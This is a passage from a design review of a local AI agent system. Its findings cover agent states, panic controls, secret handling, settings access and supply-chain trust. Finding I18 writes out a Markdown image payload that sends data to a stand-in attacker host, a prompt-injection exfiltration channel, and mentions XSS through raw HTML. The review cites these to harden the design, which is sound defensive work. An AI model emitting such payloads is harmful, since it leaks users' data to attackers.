**Where.** `01-vault.md` (Human and generated regions; Failure handling: concurrent edits);
`00-goal.md` (Failure handling: "never overwrites concurrent human edits").

**Problem.**

- **Some bytes belong to neither region.** No rule covers bytes between `generated:end` and
  `human:start`, or after `human:end`. Obsidian users type at the end of a file.
- **An end marker inside a region is undefined.** This agrees with Grok I17.
- **Check-then-replace loses edits.** An Obsidian save that lands between the hash check and the
  rename is lost, because Windows has no compare-and-swap rename.
- **The generated region is overwritten silently.** A person's edits there are replaced on the
  next dream.

**Change.**

- Define the file layout exactly. For bytes outside the two regions, choose one rule: fail
  closed, or preserve them verbatim.
- After replacing a file, re-read it and compare the human slice. Keep the original as a backup
  until that check passes.
- Record a hash of the last generated bytes. Report a person's edits to the generated region
  instead of overwriting them.
- Reword `00` to "detects, never knowingly overwrites, and restores from backup if it loses a
  race."

### I16. `NeedsHuman` entry, exit, and copy disagree

**Where.** `06-agents.md` (Accepted transitions: "resolved or explicitly cancelled, then a new
lease"); `07-computer.md` (Login walls: "Cancelling the request moves the thread to `Stopped`");
`09-frontend.md` (NeedsHuman); `11-secrets.md` (Lock state).

**Problem.**

- **Cancel goes to two different states.** `06` sends it to `Running`; `07` sends it to
  `Stopped`. The red test cannot satisfy both.
- **Two kinds are missing.** `HumanRequestKind` has no `SecretLocked` and no `Approval` (C7), yet
  `11` sends a locked secret store to `NeedsHuman`.
- **The banner has no Resume.** It offers Stop only. This agrees with Grok I7.
- **The truthful location depends on the kind:**
  - login, MFA, captcha, and bot check: the desktop browser;
  - a locked secret: the desktop app;
  - an ambiguous external outcome: the remote site, which may be checked from any device.

**Change.**

- Choose cancel → `Stopped`, the safer option, and update `06` to match.
- Add the missing kinds.
- Add a `ResolveLocation` enum (`DesktopBrowser`, `DesktopApp`, `AnyAuthorizedDevice`) that
  drives the copy on both screens.
- Show Resume wherever the location allows it.

### I17. Stop is not always reachable

**Where.** `09-frontend.md` (Phone placement; Invariant; Responsive acceptance checks);
`06-agents.md` (Panic and stopping; Failure modes: "disable unattended work and panic
mutations"); `07-computer.md` (short-lived session, CSRF); `08-rust.md` (Ownership and
concurrency: "until explicitly resumed").

**Problem.**

- **The phone stop bar is missing in some states.** It shows only while a thread is `Running`.
  It is absent for `NeedsHuman`, and for sleeping threads with a schedule due, even though panic
  still matters for both. Grok M7 proposes weakening the invariant to match; this review
  prefers fixing the UI.
- **Sheets cover it.** The full-height inspector sheet and Settings both hide the bar.
- **A session expiry adds a step.** If the phone session has expired, Stop all becomes a login
  first.
- **Panic has no visible latch and no clear control.** This agrees with Grok I8.
- **A broken audit chain disables panic.** The failure mode blocks "panic mutations." This agrees
  with Grok I16.

**Change.**

- Show the phone stop bar whenever panic would change anything, over every sheet including
  Settings.
- Accept panic from any peer that `WhoIs` verifies, reissuing the session silently.
- Show a latched banner with a Clear control, desktop-only per C6.
- Always allow engaging panic.

### I18. Untrusted content is rendered in a privileged UI

**Where.** `09-frontend.md` (Conversation, Trace); `10-security.md` (Prompt injection);
`07-computer.md` (Persistent Chrome: screenshots and DOM extracts).

**Problem.** The transcript, tool results, page extracts, and reasoning are all
attacker-influenced. They render in the same origin that holds the session able to approve
grants and change settings. Two attacks follow:

- **Image exfiltration.** Markdown can auto-load an image such as
  `![](https://attacker/?d=…)`, a known prompt-injection exfiltration channel.
- **Cross-site scripting.** Raw HTML in that content is script in a privileged origin.

No document constrains how this content renders.

**Change.**

- Render untrusted content as plain text, or as sanitized Markdown with no raw HTML.
- Load no remote images or media: set CSP `img-src 'self' data:`, limit `connect-src` to Maia's
  listeners, and allow no inline script.
- Open links externally, after a confirmation that shows the full URL.
- Add injection fixtures that assert no outbound fetch occurs.

### I19. The phone can change settings that exfiltrate data

**Where.** `09-frontend.md` (Settings; phone sees the same projections); `11-secrets.md` (only
secret values are desktop-only); `07-computer.md` (allowlist kept in settings).

**Problem.** Any authorized session can change these settings: the phone, and, until C6 is
fixed, any local process.

- **Router base URL and model.** They decide where every prompt goes, transcripts and memory
  included.
- **Tailscale allowlist.** It decides who controls the daemon.
- **Budgets.** They bound spend.

**Change.**

- Classify settings.
- Make these desktop-only, behind user presence:
  - router URL and model;
  - the allowlist;
  - raising a budget;
  - widening a grant;
  - the vault path.
- Let the phone lower budgets, revoke grants, and stop.

### I20. The secret resolution path contradicts itself

**Where.** `11-secrets.md` (Invariant 5; Resolution rules 2–4; Classification: "lease cache with
TTL"); `07-computer.md` (Configuration and capabilities: "injected secret provider");
`08-rust.md` (`run_thread` takes `secrets: &S`; `maia-tools`).

**Problem.**

- **The router needs a key it may not resolve.** It needs `RouterApiKey`, but `11` forbids
  resolve on the router path. This agrees with Grok I18.
- **The router fails the tool rule.** Resolution rule 2 requires `authorize_tool`, and a router
  call is not a tool call.
- **A long-lived key breaks two rules.** A key held for the daemon's lifetime breaks "single
  attempt" and "revoke invalidates leases."
- **`run_thread` gets too much.** It receives all of `SecretStore`: resolve, put, rotate, and
  list.
- **One port has two jobs.** `SecretStore` mixes management with resolution, breaking interface
  segregation.
- **Lease lifetime is stated two ways.** Leases are "single attempt" in Resolution rules and
  cached "with TTL" in Classification.

**Change.**

- Split the port in two:
  - `SecretCatalog`: list, put, rotate, and revoke, for the UI handlers;
  - `SecretResolver`: given only to the `Tools` adapter and to a router credential provider.
- Resolve the router credential under a `RouterAuth` grant that is not a tool grant. Cache it
  only until rotate, revoke, or panic.
- Give `run_thread` and `run_dream` neither port.

### I21. Filling a site login contradicts the rule against automating logins

**Where.** `11-secrets.md` (`SecretPurpose::SiteLogin`; Resolution rule 7: "Browser fills");
`07-computer.md` (Login walls: "if a page asks to … enter credentials … automation stops before
interacting"); `10-security.md` (Invariant 7).

**Change.** Choose one.

- Logins are human-only. Remove `SiteLogin` and rule 7.
- Credential fill is allowed for registered site contracts, with `CredentialUse` approval. MFA,
  captcha, and bot checks stay human-only. Then update `07` (Login walls) and `10` (Invariant 7)
  to match.

### I22. The injection controls are named, but none is yet a testable predicate

**Where.** `10-security.md` (Taint and provenance; Sink checks; Prompt injection: plan drift;
Policy versioning: detectors); `07-computer.md` (`OperationRisk`); `03-thread-cache.md`
(Canonical byte order).

**Problem.**

- **`TaintSet` has no derivation.** After one page read, is the whole thread tainted from then
  on, or is taint tracked per slot?
- **Spotlighting has no place in the grammar.** Untrusted origins are to be "spotlighted as data
  blocks," but `03`'s grammar has no place for that framing.
- **Plan-drift detection has no algorithm.** A model-based detector would be yet another model
  call.
- **Two risk taxonomies are not mapped.** `RiskClass` and `OperationRisk` have no defined
  correspondence.
- **Detectors are undefined.**

**Change.**

- Define a request's `TaintSet` as the union of the origins of every slot and tool result in its
  context.
- Put data-block framing into the `03` grammar.
- Remove plan drift and detectors from v1, or define them as pure predicates.
- Map each `OperationRisk` and site pair to a `RiskClass`.

### I23. The supply-chain controls have no trust root

**Where.** `10-security.md` (Supply chain and backdoors; Policy versioning and future tactics).

**Problem.**

- **Signing has no infrastructure.** "Updates are signed" and signed policy packs name no signer,
  key distribution, rotation, revocation, or update source. For a single-user local app that is
  a whole distribution system. As written it is surface area that no test can target.
- **Three supply-chain inputs are unspecified:**
  - the sidecar's language, runtime, and dependency tree;
  - where the embedder model comes from;
  - whether Chrome's version is pinned.

This review disagrees with Grok's checklist, which calls supply chain "specified."

**Change.** For v1:

- Run `cargo-deny` for advisories, licenses, and sources.
- Use `cargo-vet` or an audited lockfile.
- Pin the embedder model and the sidecar binary by hash, in an SBOM file checked at startup.
- Keep security policy as local configuration, versioned in the brain.
- Defer signed remote packs until a publisher exists.
- Name the sidecar's runtime.

### I24. Inspector selection and history lack identities and stored inputs

**Where.** `09-frontend.md` (Information architecture: "The same `FactId` drives selection";
Brain: "nodes traversed by the selected turn"; Cache turn scrubber); `03-thread-cache.md`
(Request record, Snapshot); `02-brain.md` (Observability).

**Problem.**

- **A `FactId` cannot select most slots.** Selection is a `FactId`, but slots include personas,
  episodes, compacted groups, transcript turns, and lexemes. This agrees with Grok I6.
- **Retrieval is not stored per request.** Showing the brain as it was at a past turn needs that
  request's retrieval output: the lexemes accepted and excluded, the scores, the walked paths,
  the threshold decisions, `now`, and the policy version. The request record stores none of it.
  Recomputing later gives different answers, because presentations keep accruing and reversals
  change the totals.
- **A compacted block has no internal addresses.** It holds many facts, but the snapshot keeps no
  byte range for each member, so one of them cannot be selected.

**Change.**

- Add a `SelectionKey` enum: `Fact`, `Episode`, `Slot`, `Lexeme`.
- Store a `RetrievalRecord` with each request.
- Store member byte ranges for the compacted block in each snapshot.

## Minor

**M1. Booleans where an enum would read better.**

- Replace `PanicState.engaged` (`06`, Panic and stopping) with a `PanicLatch` enum.
- Replace `ConsoleResult.truncated` (`07`, Windows console sessions) with a `Truncation` enum.
- `RouterCapabilities` (`07`) is a set of flags, but one of them selects behavior: loops are
  refused without tool calls. That one should be an enum.

**M2. Grant scope uses `Option` as a wildcard.** `SecretGrant.agent_id: Option<AgentId>` and
`thread_id: Option<ThreadId>` (`11`, Domain model) mean "any" when `None`. Use a `GrantScope`
enum instead.

**M3. `11` chooses libraries, which `08` forbids.** `11` (Design choice) names `keyring-core`
and `windows-native-keyring-store`. `08` (Explicitly out of scope) says this gate chooses no
libraries. This agrees with Grok I18.

**M4. The audit event has no policy version.** `10` (Policy versioning, step 5) requires a policy
version on every audit event, and `06`'s `AuditEvent` has no such field.

**M5. The cache mockup and the slot names disagree.**

- The Cache mockup (`09`, Inspector) shows no transcript turns, although `03` interleaves notes
  with the transcript.
- "Constitution" is not a slot name in `03`.
- The `mem_` id prefix contradicts `01`'s opaque-id rule.

**M6. Two header actions are undefined.** The `Sleep` action (`09`, Conversation) has no
user-initiated transition in `06`. What `Run` does on a sleeping thread with no new message is
also undefined.

**M7. A missing cache count would display as 0%.** The UI shows a cached percentage (`09`,
Cache). When the provider reports no cached-token count, the UI must say "not reported," never
"0%."

**M8. A closure can produce an inverted validity window.** A closure's `valid_to` can fall before
the closed fact's `valid_from` when episodes arrive out of order (`05`, Structured dream batch
schema). Specify whether that is rejected or clamped.

**M9. The generated-region line has no exact grammar.**

- Each line should be exactly ``- `<id>`: <sentence>\n``.
- Specify how a sentence escapes backticks and `<!--`.
- `render_entity_page` (`08`) needs two more inputs: the expected entity id, and a `PageSource`
  enum with `New(meta)` and `Existing(bytes)`.

**M10. A long life has no retention or migration policy.**

- Nothing bounds the growth of episodes, blobs, the FTS index, vectors, or the audit.
- After an embedder change, old vectors become unusable, and no re-embedding job is defined
  (`02`, Vector).

**M11. No single-instance lock.** Only the Chrome profile is locked (`07`). Nothing locks the
daemon, brain, or vault. Two daemons would break both the single database owner and the audit
chain.

**M12. Remote access has three loose ends.**

- The session lifetime is only "short-lived" (`07`).
- Tailscale certificates are published in Certificate Transparency logs, which exposes the
  MagicDNS name. Record this as an accepted cost.
- The loopback cookie's attributes are unspecified. This agrees with Grok I14.

**M13. Secret entry needs input hygiene.**

- Turn off autocomplete.
- Use a password-type input.
- Submit secrets through a separate endpoint, not bundled into "Save settings."
- Never echo a value in a settings `GET`.
- Define what "import" reads from (`11`, Grants and UI).

**M14. Infisical is optional surface for a single-user desktop.** Defer it to after v1 unless a
user needs it. If it stays, list the cloud host as a trust boundary in `10`. This agrees with
Grok M8.

**M15. A crash during a router call leaves no request record.** `03` (Request sequence) stores
the request record after the router call (step 7), but `06` requires the audit start event before
the call. Write a request-intent record, with ordinals and hash, before the call, and complete it
afterwards.

**M16. Budget reservations for unstarted calls are not released.** `06` (Failure modes) charges
the reservation on timeout. `07` (Router failures) treats `429` or `5xx` before any body as a
call that never started. State that those reservations are released.

**M17. The dream pre-pass has hidden inputs.** `propose_dream_candidates(episodes, facts)` (`08`)
takes neither the lexical policy nor the correction marks that `05` (Inputs and pure pre-pass)
says it uses.

**M18. `NeedsHuman` blocks redirecting the agent.** `09` (NeedsHuman) disables the composer, so a
person cannot say "skip that site" without stopping the thread. Offer "cancel the request and
reply."

## Agreement and disagreement with `REVIEW-grok-4.7.md`

**Agreement.**

- These Grok findings agree with this review: C1, C3, I1, I2, I5–I10, I12, I14, I16–I18, M2, M7
  (on the problem), and M8. Their numbered counterparts here are cited above.
- These Grok findings are not repeated here and should go into the merged list: I11
  (contradictions applied both automatically and optionally; an exact identity echo rejecting a
  good batch), I13 and M4 (layout arithmetic), I15 (unknown outcomes have no single next state),
  M1 (MCP), M3 (the Win32 `unsafe` boundary), M5 (episode nodes in the graph), and M6 (dream
  timing settings).

**Disagreement.**

- **Verdict.** Grok writes "Accept with changes" and also says implementation "is not justified
  yet" and that the workspace must not start until revision. Those two statements together mean
  revise and review again. C5 and C6 also change the architecture, which is more than an edit.
- **Severity.** The prompt grammar and wire form (C2) and compaction (C3) are Critical here; Grok
  rates them Important (Grok I3, I4). Taint fields are Important here (I3), Critical in Grok
  (Grok C2).
- **Checklist judgements.** Grok marks Tailscale/auth as fail-closed, secrets containment as
  strong, and supply chain as specified. Each depends on the loopback trust, shell isolation,
  and signer gaps in C5, C6, and I23.
- **Tool-result credit.** The plan locks that weight, so it is the user's decision (I7).
- **Phone stop.** Fix the UI rather than weakening the invariant (I17).

## Required before re-review

1. Specify recall, credit, and install as one loop (C1), the byte grammar and wire form (C2), and
   compaction (C3). Then the restart, attribution, and compaction red tests have independent
   oracles.
2. Complete the tool enum and `ToolKind` (C4).
3. Record the OS isolation boundary for the console (C5).
4. Specify the desktop-only authentication and user-presence channel (C6).
5. Define grants, approvals, and the unattended default (C7).
6. Reconcile signatures, ports, and the fact record (I1–I3).
7. Fix scope (I4), the attribution unit (I5), and ACT-R time (I8).
8. Resolve the contradictions: `NeedsHuman` cancel (I16), router secrets (I20), and site logins
   (I21).
9. Get the user's decision on tool-result credit (I7).
10. Merge the Grok findings this review agrees with into `REVIEW.md`.
11. Re-review the revised set together. Starting vault and activation work on the revised
    `01-vault.md` and `02-brain.md` can be considered only after that review.
